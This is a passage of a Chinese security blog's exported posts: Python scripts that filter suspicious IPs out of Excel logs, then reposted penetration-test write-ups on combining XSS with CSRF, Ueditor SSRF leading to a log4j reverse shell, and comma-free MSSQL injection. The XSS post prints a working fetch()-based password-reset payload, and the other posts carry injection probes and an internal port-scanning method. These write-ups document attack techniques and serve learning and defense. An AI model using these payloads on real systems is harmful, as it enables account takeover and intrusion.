<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854617.png" alt="图片"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>有部分的涉案网站也使用了宝塔面板，学习宝塔面板的使用方法，帮助我们更快地对使用了宝塔服务的涉案网站进行取证。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>宝塔面板</tag>
      </tags>
  </entry>
  <entry>
    <title>实习day1-面向excel渗透</title>
    <url>/posts/d24072c2.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天刚入职，实习的第一天没什么事干，又有点事干。</p>
<p>如果这也算渗透的话，我愿称之为：面向excel渗透。</p>
<p>这活有点蓝队溯源的性质，只有一点。</p>
<h2 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h2><p>客户的系统被邮件钓鱼了，需要溯源，同事给了两份 excel 表格，一份是 ip.xls,另一份是 qbu.xlsx </p>
<p>ip.xls 记录了ip、地址和攻击性质，需求是筛选出恶意或者海外的ip数据，再将恶意ip与qbu.xlsx里面的ip进行对比，获得是恶意或者海外ip的登录信息，缩小溯源的范围。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E4%B9%A0day1/image-20220804085013315.png" alt="image-20220804085013315"></p>
<p>qbu.xlsx 记录了时间，ip，用户名，登录详情，目标ip。需求是将ip.xls筛选出的恶意ip和qbu.xlsx的ip进行对比，筛选出那一行的数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E4%B9%A0day1/image-20220804085427964.png" alt="image-20220804085427964"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>对于这个需求，前一个表格可以通过简单的包含等于条件筛选出恶意ip数据，但后一份表格无法通过一个个去对比ip，因为ip量有点大，所以只能通过python去处理数据啦。</p>
<p>处理excel表格的python库有很多，我们又应该选择哪个呢？可以用以下命令安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple xlrd==1.2.0,xlwt</span><br></pre></td></tr></table></figure>

<p>因为新版本只支持 .xls，不支持 .xlsx,而旧版本支持 .xlsx，所以我们安装旧版本xlrd。</p>
<p>写入 excel 表格则使用 xlwt。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>针对上面的分析，我们可以使用以下代码来解决：</p>
<p>筛选 ip.xls 的 ip 的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd </span><br><span class="line"></span><br><span class="line"># 创建excel，取第一个工作簿</span><br><span class="line">rbook = xlrd.open_workbook(&#x27;ip.xls&#x27;)</span><br><span class="line">rbook.sheets()</span><br><span class="line">rsheet = rbook.sheet_by_index(0) </span><br><span class="line"></span><br><span class="line"># 将ip写入到txt中</span><br><span class="line">def writeDatatxt(data):</span><br><span class="line">    with open(&#x27;result.txt&#x27;,&#x27;a+&#x27;)as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"># 过滤数据</span><br><span class="line">def filterData():</span><br><span class="line">	global count </span><br><span class="line">	count = 0 </span><br><span class="line">	for row in rsheet.get_rows():</span><br><span class="line">		f = row[0].value</span><br><span class="line">		# 排除第一行,即表头</span><br><span class="line">		if f != &#x27;ip&#x27;:</span><br><span class="line">			data = row[1].value</span><br><span class="line">			# 筛选条件</span><br><span class="line">			if &#x27;中国&#x27; not in data or &#x27;恶意&#x27; in data:</span><br><span class="line">				print(row[0].value)</span><br><span class="line">				count += 1</span><br><span class="line">				writeDatatxt(str(row[0].value)+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	filterData()</span><br><span class="line">	print(&quot;总共有 &quot;+ str(count) +&quot; 条数据。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>筛选 qbu.xlsx 的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding: utf-8</span><br><span class="line">import xlrd</span><br><span class="line">import xlwt</span><br><span class="line"></span><br><span class="line">#################### 创建读取excel #########################</span><br><span class="line"># 打开excel文件，创建一个workbook对象,book对象也就是fruits.xlsx文件,表含有sheet名</span><br><span class="line">rbook = xlrd.open_workbook(&#x27;qbu.xlsx&#x27;)</span><br><span class="line"># sheets方法返回对象列表,[&lt;xlrd.sheet.Sheet object at 0x103f147f0&gt;]</span><br><span class="line">rbook.sheets()</span><br><span class="line"># xls默认有3个工作簿,Sheet1,Sheet2,Sheet3</span><br><span class="line">rsheet = rbook.sheet_by_index(0)  # 取第一个工作簿</span><br><span class="line"></span><br><span class="line">#################### 创建写入excel #########################</span><br><span class="line"># 第一步：创建工作簿</span><br><span class="line">wb = xlwt.Workbook()</span><br><span class="line"># 第二步：创建工作表</span><br><span class="line">ws = wb.add_sheet(&quot;result&quot;)</span><br><span class="line"></span><br><span class="line"># 从txt中读取所有ip，并返回一个列表</span><br><span class="line">def readData():</span><br><span class="line">    with open(&#x27;ip.txt&#x27;)as f:</span><br><span class="line">        ips = f.read().replace(&#x27;\n&#x27;,&#x27;,&#x27;).split(&#x27;,&#x27;)</span><br><span class="line">        return ips</span><br><span class="line"></span><br><span class="line">def writeDatatxt(data):</span><br><span class="line">    with open(&#x27;result.txt&#x27;,&#x27;a+&#x27;)as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def writeDataxls(data,count):</span><br><span class="line">    # 使用 enumerate 获取元素和序号，方便插入excel中</span><br><span class="line">    # count 默认从1开始，预留了一行，如有需求，方便添加头部</span><br><span class="line">    # i的列号，从0开始，d是数据</span><br><span class="line">    for i,d in enumerate(data):</span><br><span class="line">        ws.write(count,i,d)</span><br><span class="line"></span><br><span class="line"># 循环工作簿的所有行</span><br><span class="line">def filterData():</span><br><span class="line">    global count </span><br><span class="line">    count = 0</span><br><span class="line">    data = readData()</span><br><span class="line">    # 遍历所有的行</span><br><span class="line">    for row in rsheet.get_rows():</span><br><span class="line">        # 获取第一行第一列的值</span><br><span class="line">        head = row[0].value  </span><br><span class="line">        if head != &#x27;startTime&#x27;:  # 排除第一行</span><br><span class="line">            ip = row[1] </span><br><span class="line">            ip_value = ip.value</span><br><span class="line">            # 筛选符合的ip数据,写入表格中</span><br><span class="line">            if ip_value in data:</span><br><span class="line">                count += 1</span><br><span class="line">                row_data = []</span><br><span class="line">                for i in range(0,10):</span><br><span class="line">                    row_data.append(str(row[i].value))</span><br><span class="line">                # writeDatatxt(str(data)+&#x27;\n&#x27;)</span><br><span class="line">                writeDataxls(data,count)</span><br><span class="line">                # print(data)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    filterData()</span><br><span class="line">    wb.save(&quot;result.xls&quot;)</span><br><span class="line">    print(&quot;总共有 &quot;+ str(count) +&quot; 条数据。&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="总结分析"><a href="#总结分析" class="headerlink" title="总结分析"></a>总结分析</h2><p>之前很少使用python编写excel相关的代码，碰到这活有点吃亏。</p>
<p>手工是不可能手工的，这辈子都不可能手工。</p>
<p>能用脚本处理的工作，如果你不能解决，那只能说明你还欠缺这方面的能力，也是你需要加强的地方。</p>
<p>我觉得以后这种面向excel的渗透少不了，所以适当的可以学习一下如何使用python处理excel。</p>
<p>以后碰到这种活，心里才会有底。</p>
<p>知识不断的积累，才能建成高楼大厦。</p>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS+CSRF组合拳</title>
    <url>/posts/509541ba.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/NsRa8HNobG-hulRqu5RKbw">https://mp.weixin.qq.com/s/NsRa8HNobG-hulRqu5RKbw</a></p>
<p>推荐理由：</p>
<p>这篇文章的亮点在于，通过 XSS+CSRF 漏洞挖掘到了一个任意密码重置漏洞。</p>
<p>看到这篇文章，突然想起来以前打过一台Linux靶机，也有这个漏洞，但是当时没有记录下来。</p>
<p>漏洞原因：</p>
<p>低权限用户在自己的资料上 XSS 了一个重置管理员密码的 post 请求，只要高权限用户查看该用户的信息，就会自动提交该重置密码的请求，而请求能成功的原因就在于该 post 提交表单存在 CSRF 漏洞，没有设置 token 参数。</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近在做一些安服项目，随便挖了一些漏洞，系统功能点太少，导致只有一些小的漏洞点，领导不是很满意，随后就有了以下内容。希望大家能从文中学到点知识，来应付工作压力。</p>
<h1 id="储存型XSS漏洞的发现"><a href="#储存型XSS漏洞的发现" class="headerlink" title="储存型XSS漏洞的发现"></a><strong>储存型XSS漏洞的发现</strong></h1><p>在注册时，本着能插的地方必须插一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640.png" alt="图片"></p>
<p>访问进去果然有问题，一个低危的储存型XSS漏洞到手</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593481.png" alt="图片"></p>
<p>没啥技术含量哦，我们继续往下。</p>
<h1 id="CSRF漏洞的发现"><a href="#CSRF漏洞的发现" class="headerlink" title="CSRF漏洞的发现"></a><strong>CSRF漏洞的发现</strong></h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>注册进去后发现，系统功能点少的可怜，这时把目光投向了用户管理处</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593492.png" alt="图片"></p>
<p>一般像这种垃圾系统，必有CSRF漏洞，点击新增账号，然后burp抓包生成CSRF POC。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593493.png" alt="图片"></p>
<p>简简单单，没有技术含量。</p>
<h1 id="凑数的高危"><a href="#凑数的高危" class="headerlink" title="凑数的高危"></a><strong>凑数的高危</strong></h1><p>领导又非要出成绩，只能凑合凑合给出个高危咯。当我打开修改账户页面信息时，发现可以查看其他账户信息，那就说明这个XSS漏洞还有利用空间。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593504.png" alt="图片"></p>
<p>结合CSRF的漏洞，我们可以使用XSS+CSRF组合拳来进行恶意操作其他账户。</p>
<p>非管理员权限需要原密码修改账户密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593505.png" alt="图片"></p>
<p>但高权限账户登录后，可以直接重置其他人的密码。那么XSS和CSRF漏洞结合起来不就有一个高危漏洞任意密码重置了么。原理很简单。</p>
<p>构造请求包，原始的修改请求还是有很多的参数的，这里我尝试删除了一些无用参数。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593506.png" alt="图片"></p>
<p>使用fetch发送请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;http://webapp/workUser.action&#x27;,&#123;method: &#x27;post&#x27;,body:&#x27;vo.nickName=admin1&amp;vo.id=8057&amp;vo.password=123456&amp;confirmPwd=123456&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>插入后使用高权限账户查看低权限账户信息，在burp里就能捕获到其发出的修改密码请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8BXSS+CSRF%E7%BB%84%E5%90%88%E6%8B%B3/640-16531228593507.png" alt="图片"></p>
<p>最后登录此账户发现密码已被成功修改。</p>
<p>当然，这里的利用点不仅仅修改密码可以利用，还有其他如修改个人信息、新增用户等都可以利用，但这样水报告不太好，意思意思得了。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h1><p>当我们拿到一些低危漏洞时不要急着交，多看看相似的功能接口、组合利用，往往有其他意想不到的收获。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf+log4j=getshell</title>
    <url>/posts/ecdd5af0.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：利用 SSRF 探测内网中存在log4j影响的apache服务的默认端口，成功反弹shell。</p>
<p>SSRF 也可加 redis 未授权访问 getshell 。</p>
<p>总体的思路还是 redis + xxx，来getshell。</p>
</blockquote>
<blockquote>
<p>转载自：<a href="https://forum.butian.net/share/1085">https://forum.butian.net/share/1085</a></p>
</blockquote>
<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>某次项目中碰见了ueditor编辑器的net版本，存在任意文件上传的漏洞，也同样和其他版本一样存在ssrf的问题。<br>但是经过测试后发现，ueditor因为魔改过无法识别到版本信息，且回包为空不返回图片地址，还删除了listimage的action，导致任意文件上传无法突破。<br>最后使用了比较骚的姿势，利用get型的盲ssrf打内网的solr的log4j成功反弹shell。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-74dc2875a298edb8921d13e12644eaf9a1ca83b2.png" alt="img"></p>
<h1 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h1><p>下载源码包分析，搜索版本号可以发现在\gbk-php\下面存在一个js文件中含有ueditor的版本信息，我们可以通过这个来判断是否存在一些漏洞，web中对应的链接便是 net\ueditor.all.js 文件查看即可看见UE.version，值得注意的是只有显示大版本号。<br>存在漏洞版本：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-7c95047a1ee2de3abb11868b7fe095904852ff69.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net  =<span class="number">1.3</span>.<span class="number">6</span> || =<span class="number">1.5</span>.<span class="number">0</span>  || &lt;=<span class="number">1.4</span>.<span class="number">3</span> 存在任意文件上传，也存在下面的漏洞</span><br><span class="line">php  &lt;=<span class="number">1.4</span>.<span class="number">3</span> 存在盲ssrf、存在xml上传导致xss漏洞</span><br><span class="line">jsp    &lt;=<span class="number">1.4</span>.<span class="number">3</span> 存在盲ssrf、存在xml上传导致xss漏洞</span><br></pre></td></tr></table></figure>

<p>我们看已修复ssrf漏洞的版本，在抓取源的时候，会先去判断IP，进行过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-a091f0571f39f3bae41e0fa676d892dfd4e796e3.png" alt="img"><br>但是在小于1.4.3版本的时候，是没有进行过滤的，进而造成了ssrf漏洞。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-e20973a8f59c02795919b74170a201464fb8e912.png" alt="img"></p>
<h1 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h1><p>使用windows2016开启iis环境，在目录中拖入代码，文章篇幅有限，这里就不多赘述了，自行百度<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-c6e7ebc0ee03b46673b61153a4d57c373ba541cb.png" alt="img"><br>右键文件夹转换为应用程序即可<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-d78632ef2579b442d0907efd9c73a2592b9fcbb7.png" alt="img"><br>下面建立一个图片马让ueditor抓取<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-0ea6d37bc92efee85e359fd64aa4dd0321a3134a.jpg" alt="img"></p>
<p>感觉这里网上的文章大多都有错误，实测是建一个图片马就ok了，文件名也不用名称成乱七八糟的 1.gif?.ashx，因为url解析中?后面是get传参</p>
<p>也就是说这个漏洞根本不需要出网直接往服务器传一个图片马就ok了。（为什么需要图片马是因为会对图片进行校验）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-19eadf2ddf0043ab66b1437b7c42cd57c611429d.png" alt="img"></p>
<p>命名成1.gif?.ashx，利用python起web服务是打不成功的。路由会404<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-2b3348ef04f718b8f235a7b4b1ccd3a7da0caf26.png" alt="img"></p>
<h1 id="0x04-任意文件上传-bypass-waf"><a href="#0x04-任意文件上传-bypass-waf" class="headerlink" title="0x04 任意文件上传 bypass waf"></a>0x04 任意文件上传 bypass waf</h1><p>T00ls上的利用手段，抄了一下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-f5f8d864b91126de7310bf34fdb8ea5f1bcda999.png" alt="img"></p>
<h1 id="0x05-骚思路-Ueditor-SSRF-内网solr-log4j-反弹shell"><a href="#0x05-骚思路-Ueditor-SSRF-内网solr-log4j-反弹shell" class="headerlink" title="0x05 骚思路 Ueditor SSRF+内网solr log4j 反弹shell"></a>0x05 骚思路 Ueditor SSRF+内网solr log4j 反弹shell</h1><p>想必各位有经验的师傅，这个编辑器在hvv的目标中出现的次数想必是数不胜数了，而且这个ssrf漏洞 只在 1.4.3.1 1.4.3.2 1.4.3.3 的小版本的更新了修复。<br>仔细查阅代码发现 net 版本 1.5.0版本 是没有修复 ssrf漏洞的，而其他版本均做了修复<br>1.5.0版本的net依旧存在ssrf<br>但是一直是一个鸡肋的ssrf漏洞，该漏洞不支持302跳转，且php版本检测http开头<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-73769eb013c89a10c14bd3f05cf054af92b74bcb.png" alt="img"><br>这时又想到了一个比较骚的思路 探测内网中存在log4j影响的apache服务的默认端口<br>运用于了实战中 成功反弹了shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">受log4j漏洞影响的apache服务如下</span><br><span class="line">Apche OFBiz</span><br><span class="line">影响版本</span><br><span class="line">OFBiz &lt; v18.<span class="number">12.03</span></span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line">影响版本</span><br><span class="line">v7.<span class="number">4.0</span> &lt;= Solr &lt;= v7.<span class="number">7.3</span>v8.<span class="number">0.0</span> &lt;= Solr &lt; v8.<span class="number">11.1</span></span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line">Apache JSPWiki</span><br><span class="line">影响版本</span><br><span class="line">JSPWiki = V2.<span class="number">11.0</span></span><br><span class="line"></span><br><span class="line">Apache Filnk</span><br><span class="line">影响版本</span><br><span class="line">四个系列：&lt; v1.<span class="number">14.2</span>, &lt; v1.<span class="number">13.5</span>, &lt; v1.<span class="number">12.7</span>, &lt; v1.<span class="number">11.6</span></span><br><span class="line"></span><br><span class="line">Apache SkyWalking</span><br><span class="line">影响版本</span><br><span class="line">SkyWalking &lt; v8.<span class="number">9.1</span></span><br><span class="line"></span><br><span class="line">poc就不放这里了，又兴趣的可以看大神的公众号</span><br><span class="line">https:<span class="comment">//mp.weixin.qq.com/s?src=11&amp;timestamp=1641703846&amp;ver=3547&amp;signature=2lMGQil4y52dVorugQJChxXYc3RU4yBzhxroqI8MTNQ5T8EDbYRYjDVcltsPEG6eDzM49*eWrOB6pq3wtKUgauIvhUcqzjiUkxKKvZNCTbJSpdVd2KRz-MUg*if19OWN&amp;new=1</span></span><br></pre></td></tr></table></figure>

<h1 id="0x06-利用思路"><a href="#0x06-利用思路" class="headerlink" title="0x06 利用思路"></a>0x06 利用思路</h1><p>ueditor探测 ip+端口 存在即返回200 不存在 即 返回500<br>例如：<br>source[]&#x3D;<a href="http://10.10.10.1/">http://10.10.10.1:80</a> 200<br>source[]&#x3D;<a href="http://10.10.10.1:81/">http://10.10.10.1:81</a> 500</p>
<p>使用bp可以轻易的进行端口扫描<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-691ac3888f443d4417a96528bfb18585171360d1.png" alt="img"></p>
<p>探测到内网存在 solr的默认端口，直接一个poc打上去，成功反弹shell<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-0f1a97a869e440e6a89c7e8a5f5198eea2cc3334.png" alt="img"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-ae331cd266d54550f841c29e5bc12c2e66a316ed.png" alt="img"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-8ee4c162122181594d76c69c85e43bfd75d5d866.png" alt="img"></p>
<h1 id="0x07-笔者的一些失误记录"><a href="#0x07-笔者的一些失误记录" class="headerlink" title="0x07 笔者的一些失误记录"></a>0x07 笔者的一些失误记录</h1><p>这边一直犯了一个错误（痛失shell），POST请求中需要有content-type字段才可以被服务器接收到 post数据，之前都是用bp抓的服务器get请求，手动改方法导致，老是报错 {“state”:”参数错误：没有指定抓取源”}</p>
<p>可以使用hackbar来快速发包测试，下面的catchimage就是一个正常的action，默认存在回显<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8Bssrf+log4j=getshell/attach-c7f704436c4fba51ddc5704c8ddbc8a22e4cf1d6.png" alt="img"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>一次没有逗号的MSSQL注入</title>
    <url>/posts/78ff19ec.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语：渗透总是在不断试错，一次次的fuzz总会找到出路。</p>
<p>转载自：<a href="https://www.yuque.com/broken5/blog/lpdex0#HQxQs">https://www.yuque.com/broken5/blog/lpdex0#HQxQs</a></p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>之前遇到过遇到过类似的注入，因为某种原因在注入语句中不能存在逗号，环境又是MSSQL，所以很难构造出来有效的payload。今天在测试的时候又遇到了，怼了几个小时终于出货了，详情见下文</p>
<h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>首先是一个提交选择的表单</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122301772-30a0d389-88a5-485f-8a21-e8e7795938a7.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122333800-4b01535e-0211-4da2-9904-fa328dc12bbf.png" alt="img"></p>
<p>对<code>dcid_5</code>进行了注入测试，结果如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: <span class="number">36</span> * <span class="number">1</span></span><br><span class="line">结果：<span class="number">200</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">36</span> * a</span><br><span class="line">结果: <span class="number">500</span></span><br><span class="line"></span><br><span class="line">payload: <span class="title function_ invoke__">len</span>(user)</span><br><span class="line">结果: <span class="number">200</span></span><br><span class="line"></span><br><span class="line">payload: <span class="title function_ invoke__">len</span>(usera)</span><br><span class="line">结果: <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122432708-20aaf8ea-8f74-4f7d-ab26-ba256ac10a89.png" alt="img"></p>
<p>基本上断定这就是一个注入，然后尝试利用<code>substring(user,1,1)</code>结果报错了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122489883-4af9348b-c7e6-42ed-bab4-c8b024117a0a.png" alt="img"></p>
<p>后续又测试了<code>left(user,1)、rigth(user,1)、convert(int,1)</code>都是返回500</p>
